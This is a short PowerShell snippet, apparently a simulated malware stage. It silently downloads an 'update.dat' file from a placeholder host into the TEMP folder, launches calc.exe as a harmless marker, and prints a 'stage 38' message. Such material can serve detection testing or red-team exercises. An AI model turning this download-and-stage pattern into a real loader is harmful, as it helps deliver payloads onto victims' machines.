
$DownloadUrl = 'https://example.org/assets/update.dat'
$DownloadPath = "$env:TEMP\update.dat"
curl.exe -s -L -o $DownloadPath $DownloadUrl
Start-Process -FilePath 'calc.exe' -ErrorAction SilentlyContinue
Write-Output "stage 38 initialized"
